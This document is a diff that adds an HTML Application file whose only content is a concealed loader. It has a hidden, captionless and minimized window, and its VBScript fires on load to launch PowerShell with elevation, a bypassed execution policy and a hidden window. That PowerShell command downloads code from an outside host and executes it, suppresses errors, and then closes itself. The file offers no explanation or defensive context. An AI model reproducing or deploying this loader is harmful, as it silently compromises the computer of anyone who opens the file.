@@ -1,0 +1,26 @@
+<html>
+<head>
+    <title>.</title>
+    <HTA:APPLICATION
+        ID="w"
+        APPLICATIONNAME="."
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"
+    />
+    <script language="VBScript">
+        Sub StartProcess
+            Dim shellApp
+            Set shellApp = CreateObject("Shell.Application")
+            shellApp.ShellExecute "powershell", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""try { iwr https://pw91.xyz/api/pw -UseBasicParsing | iex } catch { }""", "", "runas", 0
+            Self.Close
+        End Sub
+        window.setTimeout "StartProcess", 100
+    </script>
+</head>
+<body style="display:none;">
+</body>
+</html>
